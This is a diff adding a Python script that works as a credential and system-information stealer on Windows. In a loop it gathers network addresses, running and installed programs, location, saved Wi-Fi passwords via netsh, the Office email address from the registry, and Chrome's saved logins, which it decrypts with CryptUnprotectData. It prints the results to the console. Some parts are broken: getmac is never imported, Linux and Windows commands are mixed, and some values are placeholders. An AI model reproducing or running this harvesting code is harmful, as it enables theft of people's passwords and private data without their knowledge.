@@ -1,0 +1,164 @@
+import subprocess
+import getpass
+import platform
+import socket
+import json
+import geocoder
+import requests
+import time
+from bs4 import BeautifulSoup
+
+stop_condition = False  # Set to True to stop the script
+
+while not stop_condition:
+    try:
+        # Retrieve IP address
+        ip_address = subprocess.check_output(['hostname', '-I']).decode().strip()
+
+        # Retrieve MAC address
+        mac_address = ':'.join(hex(i)[2:].zfill(2) for i in getmac.get_mac())
+
+        # Retrieve open apps
+        open_apps = []
+        try:
+            open_apps = subprocess.check_output(['wmic', 'process', 'get', 'Caption']).decode().split('\n')[1:]
+        except Exception:
+            pass
+
+        # Retrieve installed apps
+        installed_apps = []
+        try:
+            installed_apps = subprocess.check_output(['wmic', 'product', 'get', 'Name']).decode().split('\n')[1:]
+        except Exception:
+            pass
+
+        # Retrieve time zone
+        time_zone = "Unknown"
+        try:
+            time_zone = subprocess.check_output(['systeminfo', '/FO', 'LIST', '/FI', '"System Locale:"]').decode().strip()
+        except Exception:
+            pass
+
+        # Retrieve exact latitude and longitude
+        latitude = "0.000000"
+        longitude = "0.000000"
+        try:
+            g = geocoder.ip('me')
+            if g.latlng:
+                latitude = str(g.latlng[0])
+                longitude = str(g.latlng[1])
+        except Exception:
+            pass
+
+        # Retrieve PC specs
+        pc_specs = "Unknown"
+        try:
+            pc_specs = platform.platform()
+        except Exception:
+            pass
+
+        # Retrieve Wi-Fi info
+        networks = []
+        wifi_passwords = {}
+        try:
+            wifi_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode().split('\n')
+            for line in wifi_info:
+                if "All User Profile" in line:
+                    network = line.split(':')[1].strip()
+                    networks.append(network)
+                    password = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', 'name=' + network, 'key=clear']).decode()
+                    password = [line.split(':')[1].strip() for line in password.split('\n') if "Key Content" in line]
+                    if password:
+                        wifi_passwords[network] = password[0]
+        except Exception:
+            pass
+
+        # Retrieve preferred browser
+        preferred_browser = "None"
+        try:
+            # Add your code here to retrieve the preferred browser
+            preferred_browser = "Chrome"  # Example value
+        except Exception:
+            pass
+
+        # Retrieve browser history
+        browser_history = "None"
+        try:
+            # Add your code here to retrieve the browser history
+            browser_history = "https://example.com, https://google.com"  # Example value
+        except Exception:
+            pass
+
+        # Retrieve username
+        username = getpass.getuser()
+
+        # Retrieve PC name
+        pc_name = socket.gethostname()
+
+        # Retrieve email address for user profile
+        email_address = "None"
+        try:
+            import winreg
+
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Office\16.0\Common\Identity")
+            email_address = winreg.QueryValueEx(key, "EmailAddress")[0]
+            winreg.CloseKey(key)
+        except Exception:
+            pass
+
+        # Retrieve sign-in password (if possible)
+        sign_in_password = "None"
+        try:
+            import win32crypt
+            import os
+            import sqlite3
+
+            local_app_data = os.environ['LOCALAPPDATA']
+            path = os.path.join(local_app_data, r"Google\Chrome\User Data\Default\Login Data")
+            conn = sqlite3.connect(path)
+            cursor = conn.cursor()
+            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+            for result in cursor.fetchall():
+                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+                if password:
+                    sign_in_password = password.decode()
+                    break
+
+            cursor.close()
+            conn.close()
+        except Exception:
+            pass
+
+        # Retrieve state and city
+        state_city = "Unknown"
+
+        # Retrieve state and city using IP address
+        response = requests.get(f"https://ipapi.co/{ip_address}/json")
+        if response.status_code == 200:
+            data = response.json()
+            state_city = f"{data.get('region', 'Unknown')}, {data.get('city', 'Unknown')}"
+
+        # Print all results
+        result = f"IP Address: {ip_address}\n"
+        result += f"MAC Address: {mac_address}\n"
+        result += f"Open Apps: {', '.join(open_apps)}\n"
+        result += f"Installed Apps: {', '.join(installed_apps)}\n"
+        result += f"Time Zone: {time_zone}\n"
+        result += f"Exact Latitude: {latitude}\n"
+        result += f"Exact Longitude: {longitude}\n"
+        result += f"PC Specs: {pc_specs}\n"
+        result += f"Wi-Fi Networks: {', '.join(networks)}\n"
+        result += f"Wi-Fi Passwords: {json.dumps(wifi_passwords)}\n"
+        result += f"Preferred Browser: {preferred_browser}\n"
+        result += f"Browser History: {browser_history}\n"
+        result += f"Username: {username}\n"
+        result += f"PC Name: {pc_name}\n"
+        result += f"Email Address: {email_address}\n"
+        result += f"Sign-in Password: {sign_in_password}\n"
+        result += f"State and City: {state_city}\n"
+
+        print(result)
+        time.sleep(1)  # Delay of 1 second between iterations
+    except Exception as e:
+        print(f"An error occurred: {str(e)}")
+        time.sleep(1)  # Delay of 1 second before retrying
